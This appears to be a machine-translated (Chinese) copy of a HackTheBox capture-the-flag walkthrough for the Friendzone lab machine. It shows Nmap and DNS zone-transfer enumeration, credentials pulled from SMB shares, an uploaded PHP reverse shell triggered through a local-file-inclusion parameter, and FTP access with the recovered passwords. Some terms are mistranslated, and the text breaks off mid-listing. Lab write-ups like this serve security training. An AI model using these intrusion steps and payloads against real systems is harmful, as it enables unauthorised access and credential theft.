<html>
<head>
<title>HacktheBox — Friendzone</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客盒子——友谊地带</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackthebox-friendzone-9c52df249dcd?source=collection_archive---------0-----------------------#2019-07-13">https://infosecwriteups.com/hackthebox-friendzone-9c52df249dcd?source=collection_archive---------0-----------------------#2019-07-13</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="32d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一篇关于我如何从HacktheBox中解决框Friendzone的文章。</p><p id="8573" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="http://hackthebox.eu" rel="noopener ugc nofollow" target="_blank"> Hack the Box </a>是一个在线平台，你可以在这里练习渗透测试技能。</p><p id="0139" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如我一直做的那样，我试图解释我是如何从机器上理解这里的概念的，因为我想真正理解事物是如何工作的。所以请，如果我误解了一个概念，请让我知道。非常欢迎您的指正。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi km"><img src="../Images/11a7e518cddf6b5a3fd27a82ec054a43.png" data-original-src="https://miro.medium.com/v2/resize:fit:1354/format:webp/1*3fouiVW6YlXMLTmFpTXfdg.png"/></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">来源:hackthebox.eu</figcaption></figure><h1 id="c7da" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">关于盒子</h1><p id="75f5" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">这个盒子很有趣，但同时也很棒。这是我解决的早期箱子之一。它利用适当的枚举，然后你应该能够连接这些点。</p><h1 id="33c8" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">#TLDR</h1><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="09c8" class="mg kz iq mc b gy mh mi l mj mk">Initial foothold: DNS enumeration leads to a login page, where credentials to be used are found thru SMB<br/>User: LFI of the file upload from SMB<br/>Root: DLL Hijacking of a regularly running file importing a world-writeable library</span></pre><h1 id="6e6a" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">#最初的立足点</h1><p id="3b9e" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">像往常一样，我运行Nmap扫描，并将其保存到我的Nmap目录中:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="2082" class="mg kz iq mc b gy mh mi l mj mk">nmap -sV -sC -oA nmap/initial 10.10.10.123</span></pre><p id="6f19" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">输出是:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="583d" class="mg kz iq mc b gy mh mi l mj mk">Nmap scan report for 10.10.10.123<br/>Host is up (0.29s latency).<br/>Not shown: 993 closed ports<br/>PORT    STATE SERVICE     VERSION<br/>21/tcp  open  ftp         vsftpd 3.0.3<br/>22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br/>| ssh-hostkey: <br/>|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)<br/>|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)<br/>|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)<br/>53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)<br/>| dns-nsid: <br/>|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu<br/>80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))<br/>|_http-server-header: Apache/2.4.29 (Ubuntu)<br/>|_http-title: Friend Zone Escape software<br/>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br/>443/tcp open  ssl/http    Apache httpd 2.4.29<br/>|_http-server-header: Apache/2.4.29 (Ubuntu)<br/>|_http-title: 404 Not Found<br/>| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO<br/>| Not valid before: 2018-10-05T21:02:30<br/>|_Not valid after:  2018-11-04T21:02:30<br/>|_ssl-date: TLS randomness does not represent time<br/>| tls-alpn: <br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>&lt;redacted&gt;<br/>445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)<br/>Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><span id="d4f7" class="mg kz iq mc b gy ml mi l mj mk">445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)<br/>Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><span id="a9e2" class="mg kz iq mc b gy ml mi l mj mk">Host script results:<br/>|_clock-skew: mean: -39m58s, deviation: 1h09m14s, median: 0s<br/>|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br/>| smb-os-discovery: <br/>|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)<br/>|   Computer name: friendzone<br/>|   NetBIOS computer name: FRIENDZONE\x00<br/>|   Domain name: \x00<br/>|   FQDN: friendzone<br/>|_  System time: 2019-03-06T09:13:45+02:00<br/>| smb-security-mode: <br/>|   account_used: guest<br/>|   authentication_level: user<br/>|   challenge_response: supported<br/>|_  message_signing: disabled (dangerous, but default)<br/>| smb2-security-mode: <br/>|   2.02: <br/>|_    Message signing enabled but not required<br/>| smb2-time: <br/>|   date: 2019-03-05 23:13:43<br/>|_  start_date: N/A</span><span id="29f4" class="mg kz iq mc b gy ml mi l mj mk">Service detection performed. Please report any incorrect results at <a class="ae kl" href="https://nmap.org/submit/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/submit/</a> .<br/># Nmap done at Tue Mar  5 23:45:44 2019 -- 1 IP address (1 host up) scanned in 1972.54 seconds</span></pre><p id="9544" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以开放端口是21、22、53、80、139、443、445。</p><p id="433b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">访问端口80时，我看到了这个页面:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mm"><img src="../Images/df9e5edab9c4381a4c7f480549a0e450.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QRVzES1QSXbExHGzrpQ3fQ.png"/></div></div></figure><p id="aeb0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它谈到了离开这个区域和一个联系电子邮件。我试着进入friendzoneportal.red但是我认为它没有关联。英雄联盟</p><p id="4c60" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于FTP也是开放的，我尝试是否可以匿名登录，使用匿名作为用户名和基本上任何密码。</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="86da" class="mg kz iq mc b gy mh mi l mj mk">➜  writeup ftp 10.10.10.123<br/>Connected to 10.10.10.123.<br/>220 (vsFTPd 3.0.3)<br/>Name (10.10.10.123:root): anonymous<br/>331 Please specify the password.<br/>Password:<br/>530 Login incorrect.<br/>Login failed.<br/>ftp&gt;</span></pre><p id="a34e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不允许匿名登录，所以我继续使用SMB枚举。我使用smbclient来列出股份:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="6287" class="mg kz iq mc b gy mh mi l mj mk">smbclient -L 10.10.10.123</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mr"><img src="../Images/65ee488170197099f05fa2f1e83e6c09.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RVi4cDn7cAeNrWaZ8C16cQ.png"/></div></div></figure><p id="9c70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">文件共享后，突出的是/etc/文件。这对以后很重要。然后，我试图访问共享文件，但访问被拒绝。我用smbmap看权限。这就是smbmap的好处。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi ms"><img src="../Images/ad37f483cdefb5e0b2cd97830b5c7422.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fKeQpKuLHBKTmtkJll0hRA.png"/></div></div></figure><p id="a5f7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看到我能读和写的地方，我在共享中寻找有用的文件。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mt"><img src="../Images/b111d68906477f1334204f010324b51e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ju3qNWCHcLv57giRr-g3xg.png"/></div></div></figure><p id="b832" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我能够从通用共享中检索到一个creds.txt文件。然后，我还尝试在我们有写权限的共享(开发共享)上上传文件。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mu"><img src="../Images/ecc3bbe9597a0ba676589bb83883bc5d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KmCbUmlD6B5XIGUEeyu9aQ.png"/></div></div></figure><p id="e0a7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">打开creds.txt:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="e1f4" class="mg kz iq mc b gy mh mi l mj mk">➜  writeup cat creds.txt <br/>creds for the admin THING:</span><span id="8d73" class="mg kz iq mc b gy ml mi l mj mk">admin:WORKWORKHhallelujah@#</span></pre><p id="4280" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我尝试使用凭证访问FTP和SMB服务，但它不起作用。</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="8ef5" class="mg kz iq mc b gy mh mi l mj mk">➜  writeup ftp 10.10.10.123<br/>Connected to 10.10.10.123.<br/>220 (vsFTPd 3.0.3)<br/>Name (10.10.10.123:root): admin<br/>331 Please specify the password.<br/>Password:<br/>530 Login incorrect.<br/>Login failed.</span></pre><p id="6998" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为我们不知道在哪里可以使用凭证，所以我转到HTTP。从nmap结果来看，站点的commonName是friendzone.red，而不是friendzoneportal.red。另外，我还看到了创建证书以访问HTTPS中的信息。然后，我将friendzone.red添加到我的/etc/hosts文件中。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mv"><img src="../Images/faa368bd450ef1b4e5b4340c9e7ef237.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xrKq8U0av1YH0p9mXiQEQQ.png"/></div></div></figure><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="7a31" class="mg kz iq mc b gy mh mi l mj mk">10.10.10.123    friendzone.red</span></pre><p id="f5db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">转到端口80显示相同的页面:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mw"><img src="../Images/5827e842eb4075180b77fe202def1351.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FjtdZunw3_bFcT5BkDoSsg.png"/></div></div></figure><p id="16dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">另一个开放端口是53，这是DNS。现在大部分人都知道53端口只有DNS UDP，不知道还有TCP。</p><p id="c8c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">DNS TCP用于区域传输，或者当响应大小超过512字节限制时使用。在这里阅读更多关于RFC的信息:【https://tools.ietf.org/html/rfc7766<a class="ae kl" href="https://tools.ietf.org/html/rfc7766" rel="noopener ugc nofollow" target="_blank">。</a></p><p id="1da4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我尝试使用带有axfr(用于区域转移)标志的dig进行区域转移，从DNS服务器10.10.10.123查询friendzone.red(因为HTB机器的DNS服务器与它们的IP相同):</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="25ad" class="mg kz iq mc b gy mh mi l mj mk">➜  writeup dig axfr friendzone.red <a class="ae kl" href="http://twitter.com/10" rel="noopener ugc nofollow" target="_blank">@10</a>.10.10.123</span><span id="77e3" class="mg kz iq mc b gy ml mi l mj mk">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; axfr friendzone.red <a class="ae kl" href="http://twitter.com/10" rel="noopener ugc nofollow" target="_blank">@10</a>.10.10.123<br/>;; global options: +cmd<br/>friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800<br/>friendzone.red.         604800  IN      AAAA    ::1<br/>friendzone.red.         604800  IN      NS      localhost.<br/>friendzone.red.         604800  IN      A       127.0.0.1<br/>administrator1.friendzone.red. 604800 IN A      127.0.0.1<br/>hr.friendzone.red.      604800  IN      A       127.0.0.1<br/>uploads.friendzone.red. 604800  IN      A       127.0.0.1<br/>friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800</span></pre><p id="0e98" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于它的工作，我们现在可以看到子域。既然我们列举了其他子域，我们应该将它们添加到/etc/hosts文件中:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="c82f" class="mg kz iq mc b gy mh mi l mj mk">10.10.10.123    friendzone.red administrator1.friendzone.red \ hr.friendzone.red uploads.friendzone.red</span></pre><p id="5824" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">转到hr.friendzone.red:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mx"><img src="../Images/1b8d8b2d753fc648b43f4f166f630f0e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ymchst_ouAvAhffgD7T0gQ.png"/></div></div></figure><p id="61fb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">转到uploads.friendzone.red(注意我们得到的是https，而不是来自hr子域的http):</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi my"><img src="../Images/130b45d0cb1002b427319102460bd4a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ANUHSbQHxWcDB4VWmNCtIQ.png"/></div></div></figure><p id="759a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试着上传一个文本文件，成功了。至少我知道有两种方法可以上传文件(通过这个页面和SMB)，但我不知道它们存储在哪里。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mr"><img src="../Images/d1ef7d00b9581d1b0cad3a832c24a012.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*R9JSQEp-KdnpKabUwl0qTw.png"/></div></div></figure><p id="994f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">转到administrator1.friendzone.red，我们看到一个登录页面:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mz"><img src="../Images/f3f5a21dd01cc9092c8dcb81f1c828f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*27bb2DhANGOKlnzMwdZkIg.png"/></div></div></figure><p id="44cd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我使用了凭证，并且成功了:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="97ef" class="mg kz iq mc b gy mh mi l mj mk">admin:WORKWORKHhallelujah@#</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi na"><img src="../Images/467695bc4303dad675747ffba0171e64.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*J9aqpbXJ7Go_wpNiGidJYg.png"/></div></div></figure><h1 id="63b8" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">获取用户:</h1><p id="364b" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">该页面告诉我们，我们正在处理一个初学者php开发人员。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nb"><img src="../Images/5dfc8845b22d7d65f4e741bd2c70c14e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dSJYYZ9oTazogUjDIseKKQ.png"/></div></div></figure><p id="8efe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我只是按照所说的访问图片<strong class="jp ir">a.jpg</strong>和页面<strong class="jp ir">名称时间戳</strong></p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nc"><img src="../Images/7a219d0ee75cdacb9d2b50b80a730660.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aj9A8KSKko4Igb2ZSDk-hA.png"/></div></div></figure><p id="eb57" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意，我们在左下角得到一个“最终访问时间戳是”。它是不断变化的，我检查了它的纪元时间，它使用1970年1月1日作为参考。这意味着web服务器上有一个脚本在做这件事。</p><p id="e685" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于命名约定是“<strong class="jp ir"> letter.jpg”，</strong>我试着检查是否有一个名为b.jpg的文件:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nd"><img src="../Images/e55b7b195183a3d72f57067e60c2a2ba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ob6LQP9J_c_dDURAqUwiJQ.png"/></div></div></figure><p id="9e0d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有。我按CTRL + u查看源代码:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi ne"><img src="../Images/5139e5de95088f74ab75691ef325479a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CT2QwXyioscKlXMuerOuog.png"/></div></div></figure><p id="59e6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我看到它们存储在images文件夹中，并且只有两张图片(a和b)。我试着访问z.jpg，看看它会有什么反应:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nf"><img src="../Images/b9304e155bfab419d18f9e5fa5b97e15.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CJQ9ZEb3sNEutNc71_eGSQ.png"/></div></div></figure><p id="2869" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为有一个错误，我通过尝试读取etc/passwd来测试这是否容易受到LFI(本地文件包含)的攻击。我没有输出:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi ng"><img src="../Images/aad4bd27656634edfc0218c29fbabc34.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mz_2ZH3pI4K48lTq8jPRoA.png"/></div></div></figure><p id="9003" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在尝试识别LFI的方法后，我想起我们可以通过SMB上传文件，文件共享位置是/etc/Files。所以直观上，可能所有的共享都遵循/etc/sharename格式。我试着从pentest monkey 上传php反向shell，因为web服务器运行在php上。</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="6e67" class="mg kz iq mc b gy mh mi l mj mk">➜  writeup smbclient \\\\10.10.10.123\\Development                                                                                    <br/>Enter WORKGROUP\root's password: <br/>Try "help" to get a list of possible commands.<br/>smb: \&gt; put rev.php <br/>putting file rev.php as \rev.php (8.3 kb/s) (average 8.3 kb/s)<br/>smb: \&gt; dir<br/>  .                                   D        0  Sat Jul 13 01:36:59 2019<br/>  ..                                  D        0  Wed Jan 23 21:51:02 2019<br/>  rev.php                             A     5492  Sat Jul 13 01:37:46 2019<br/>  test                                A        7  Sat Jul 13 00:39:02 2019</span><span id="e51b" class="mg kz iq mc b gy ml mi l mj mk">9221460 blocks of size 1024. 6458420 blocks available</span></pre><p id="cf8c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">能够上传文件，我试图通过LFI触发它。在无数次尝试之后，LFI在哪里，我终于得到了我的听众的回电。看起来时间戳函数是一个php文件。我的LFI的php扩展触发了回调。</p><p id="8381" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以对于LFI来说，它应该是:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="6e5a" class="mg kz iq mc b gy mh mi l mj mk">pagename=/etc/Development/rev</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mw"><img src="../Images/82f01e68fd7b01229c44da96646f92f2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*t2SAWtJOAM28Qa83BgLKWQ.png"/></div></div></figure><p id="394e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">获取反向外壳:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nh"><img src="../Images/06f216bd9c196c5af77f6cfecb93653d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yRqQbuVPqyeygNwopHr-eQ.png"/></div></div></figure><p id="4ebd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">修复我们的外壳后(有大量的参考资料，你也可以参考我的HTB-混沌文章)。</p><p id="edc4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我检查了文件，一个mysql_data.conf脱颖而出:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="d667" class="mg kz iq mc b gy mh mi l mj mk">www-data@FriendZone:/var/www$ cat mysql_data.conf <br/>for development process this is the mysql creds for user friend</span><span id="40d1" class="mg kz iq mc b gy ml mi l mj mk">db_user=<strong class="mc ir">friend</strong></span><span id="65a7" class="mg kz iq mc b gy ml mi l mj mk">db_pass=<strong class="mc ir">Agpyu12!0.213$</strong></span><span id="54f4" class="mg kz iq mc b gy ml mi l mj mk">db_name=FZ</span></pre><p id="1d1e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们找到用户朋友的凭证。由于我在FTP中没有工作凭证，所以我在那里尝试了一下，结果成功了:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="ae0b" class="mg kz iq mc b gy mh mi l mj mk">➜  writeup ftp 10.10.10.123<br/>Connected to 10.10.10.123.<br/>220 (vsFTPd 3.0.3)<br/>Name (10.10.10.123:root): friend<br/>331 Please specify the password.<br/>Password:<br/>230 Login successful.<br/>Remote system type is UNIX.<br/>Using binary mode to transfer files.<br/>ftp&gt; ls <br/>200 PORT command successful. Consider using PASV.<br/>150 Here comes the directory listing.<br/>-r--r--r--    1 0        0              33 Oct 06  2018 user.txt<br/>226 Directory send OK.<br/>ftp&gt; get user.txt<br/>local: user.txt remote: user.txt<br/>200 PORT command successful. Consider using PASV.<br/>150 Opening BINARY mode data connection for user.txt (33 bytes).<br/>226 Transfer complete.<br/>33 bytes received in 0.00 secs (388.2719 kB/s)<br/>ftp&gt; exit<br/>221 Goodbye.<br/>➜  writeup cat user.txt <br/><strong class="mc ir">a9ed20acecd6c5b6b52f474e15ae9a11</strong></span></pre><p id="1f0c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我知道有user.txt .检查php文件，验证我的推测:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi ni"><img src="../Images/88bb366a8bd8f7eb371200a2a72dda78.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MESb5BIfuFAIb6_btyWRdA.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">login.php</figcaption></figure><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nj"><img src="../Images/c9e383380411cc1778611e949f3aa74d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5P7-ovhRJXIFbXBYNY5kUw.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">dashboard.php</figcaption></figure><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nk"><img src="../Images/61cdc6283e535c0b408c51890e27a689.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*o3q4f1w2ETyIlZwz2Xx9yQ.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">timestamp.php</figcaption></figure><p id="9dd0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查更多文件:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="c56c" class="mg kz iq mc b gy mh mi l mj mk">www-data@FriendZone:/var/www$ ls<br/>admin       friendzoneportal       html             uploads<br/>friendzone  friendzoneportaladmin  mysql_data.conf<br/>www-data@FriendZone:/var/www$ cd html<br/>www-data@FriendZone:/var/www/html$ ls<br/>fz.jpg  index.bak  index.html  